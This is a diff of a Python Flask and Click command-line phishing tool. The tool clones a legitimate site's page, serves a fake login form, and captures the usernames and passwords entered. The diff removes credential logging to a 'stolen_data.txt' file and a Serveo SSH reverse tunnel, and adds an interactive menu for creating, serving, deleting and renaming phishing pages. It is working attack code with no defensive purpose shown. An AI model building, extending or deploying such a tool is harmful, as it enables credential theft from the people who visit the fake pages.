@@ -20,24 +20,11 @@ from bs4 import BeautifulSoup
 from urllib.parse import urljoin
 from flask import Flask, request, redirect, render_template_string
 import click
-import subprocess
 
 app = Flask(__name__)
 
-# Directory to store phishing pages and stolen data
+# Directory to store phishing pages
 PHISHING_PAGES_DIR = 'phishing_pages'
-LOG_DIR = 'logs'
-LOG_FILE = os.path.join(LOG_DIR, 'stolen_data.txt')
-
-# Serveo settings
-SERVEO_URL = 'https://your-serveo-url.serveo.net'  # Replace with your Serveo URL
-
-# Ensure directories exist
-if not os.path.exists(PHISHING_PAGES_DIR):
-    os.makedirs(PHISHING_PAGES_DIR)
-
-if not os.path.exists(LOG_DIR):
-    os.makedirs(LOG_DIR)
 
 # Function to copy script content from a legitimate URL
 def copy_page_script(url):
@@ -90,7 +77,7 @@ def generate_phishing_page(legitimate_url, phishing_page_name):
         <h1>{phishing_page_name}</h1>
         <div class="login-container">
             <h2>Login Form</h2>
-            <form action="{SERVEO_URL}/steal_credentials" method="post">
+            <form action="/steal_credentials" method="post">
                 <label for="username">Username:</label>
                 <input type="text" id="username" name="username"><br><br>
                 <label for="password">Password:</label>
@@ -134,11 +121,6 @@ def rename_phishing_page(old_name, new_name):
         return True
     return False
 
-# Function to log stolen credentials and IP address
-def log_stolen_data(username, password, ip_address):
-    with open(LOG_FILE, 'a') as f:
-        f.write(f"IP: {ip_address}, Username: {username}, Password: {password}\n")
-
 # Flask routes
 @app.route('/')
 def serve_phishing_page():
@@ -154,32 +136,12 @@ def serve_phishing_page():
 def steal_credentials():
     username = request.form['username']
     password = request.form['password']
-    ip_address = request.remote_addr
-    log_stolen_data(username, password, ip_address)
-    print(f"Stolen credentials: IP - {ip_address}, Username - {username}, Password - {password}")
+    print(f"Stolen credentials: Username - {username}, Password - {password}")
     return redirect(request.url)
-
-# Function to start Serveo
-def start_serveo():
-    try:
-        subprocess.Popen(['ssh', '-R', '80:localhost:5000', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        click.echo("Serveo tunnel started. Your phishing pages are now accessible via Serveo.")
-        click.echo("Ctrl+C to stop Serveo when done.")
-    except Exception as e:
-        click.echo(f"Error starting Serveo tunnel: {e}")
-
-# Function to stop Serveo
-def stop_serveo():
-    try:
-        subprocess.run(['pkill', '-f', 'ssh -R 80:localhost:5000 serveo.net'], check=True)
-        click.echo("Serveo tunnel stopped.")
-    except Exception as e:
-        click.echo(f"Error stopping Serveo tunnel: {e}")
 
 # CLI commands using Click
 @click.group()
 def cli():
-    """Phishing Tool Command Line Interface"""
     if not os.path.exists(PHISHING_PAGES_DIR):
         os.makedirs(PHISHING_PAGES_DIR)
 
@@ -188,15 +150,11 @@ def cli():
 @click.option('--name', prompt='Enter the phishing page name', help='Name of the phishing page')
 def create(url, name):
     """Create a new phishing page."""
-    phishing_page_path = os.path.join(PHISHING_PAGES_DIR, f'{name}.html')
-    if os.path.exists(phishing_page_path):
-        click.echo(f"Phishing page with name '{name}' already exists. Choose a different name.")
+    if os.path.exists(os.path.join(PHISHING_PAGES_DIR, f'{name}.html')):
+        click.echo(f"Phishing page with name '{name}' already exists.")
         return
-    try:
-        phishing_page_file = generate_phishing_page(url, name)
-        click.echo(f"Phishing page '{name}' created successfully: {phishing_page_file}")
-    except Exception as e:
-        click.echo(f"Error creating phishing page: {e}")
+    phishing_page_file = generate_phishing_page(url, name)
+    click.echo(f"Phishing page '{name}' created successfully: {phishing_page_file}")
 
 @cli.command()
 def list():
@@ -213,34 +171,70 @@ def list():
 @click.argument('name')
 def delete(name):
     """Delete a phishing page by name."""
-    try:
-        if delete_phishing_page(name):
-            click.echo(f"Phishing page '{name}' deleted successfully.")
-        else:
-            click.echo(f"Phishing page '{name}' not found.")
-    except Exception as e:
-        click.echo(f"Error deleting phishing page: {e}")
+    if delete_phishing_page(name):
+        click.echo(f"Phishing page '{name}' deleted successfully.")
+    else:
+        click.echo(f"Phishing page '{name}' not found.")
 
 @cli.command()
 @click.argument('old_name')
 @click.option('--new_name', prompt='Enter the new name', help='New name for the phishing page')
 def rename(old_name, new_name):
     """Rename a phishing page."""
-    try:
-        if os.path.exists(os.path.join(PHISHING_PAGES_DIR, f'{new_name}.html')):
-            click.echo(f"Phishing page with name '{new_name}' already exists. Choose a different name.")
-            return
-        if rename_phishing_page(old_name, new_name):
-            click.echo(f"Phishing page '{old_name}' renamed to '{new_name}' successfully.")
-        else:
-            click.echo(f"Phishing page '{old_name}' not found.")
-    except Exception as e:
-        click.echo(f"Error renaming phishing page: {e}")
+    if os.path.exists(os.path.join(PHISHING_PAGES_DIR, f'{new_name}.html')):
+        click.echo(f"Phishing page with name '{new_name}' already exists.")
+        return
+    if rename_phishing_page(old_name, new_name):
+        click.echo(f"Phishing page '{old_name}' renamed to '{new_name}' successfully.")
+    else:
+        click.echo(f"Phishing page '{old_name}' not found.")
 
 @cli.command()
-def view():
-    """View the content of a phishing page."""
+def start():
+    """Start the phishing tool."""
+    click.echo("Welcome to the phishing tool!")
     phishing_pages = list_phishing_pages()
-    if not phishing_pages:
-        click.echo
+    if phishing_pages:
+        click.echo("Available phishing pages:")
+        for index, page in enumerate(phishing_pages):
+            click.echo(f"{index + 1}. {page.replace('.html', '')}")
 
+    action = click.prompt("Do you want to (1) create a new phishing page, (2) choose an existing one, (3) delete an existing page, or (4) rename an existing page?", type=int)
+
+    if action == 1:
+        url = click.prompt('Enter the legitimate URL')
+        name = click.prompt('Enter the phishing page name')
+        create.invoke(None, url=url, name=name)
+    elif action == 2:
+        list.invoke(None)
+        page_input = click.prompt('Enter the number or name of the phishing page you want to serve')
+        try:
+            page_index = int(page_input) - 1
+            page = phishing_pages[page_index].replace('.html', '')
+        except (ValueError, IndexError):
+            page = page_input
+        serve.invoke(None, page=page)
+    elif action == 3:
+        list.invoke(None)
+        page_input = click.prompt('Enter the number or name of the phishing page you want to delete')
+        try:
+            page_index = int(page_input) - 1
+            page = phishing_pages[page_index].replace('.html', '')
+        except (ValueError, IndexError):
+            page = page_input
+        delete.invoke(None, name=page)
+    elif action == 4:
+        list.invoke(None)
+        old_name_input = click.prompt('Enter the number or name of the phishing page you want to rename')
+        try:
+            page_index = int(old_name_input) - 1
+            old_name = phishing_pages[page_index].replace('.html', '')
+        except (ValueError, IndexError):
+            old_name = old_name_input
+        new_name = click.prompt('Enter the new name for the phishing page')
+        rename.invoke(None, old_name=old_name, new_name=new_name)
+    else:
+        click.echo("Invalid choice. Exiting.")
+
+if __name__ == '__main__':
+    cli()
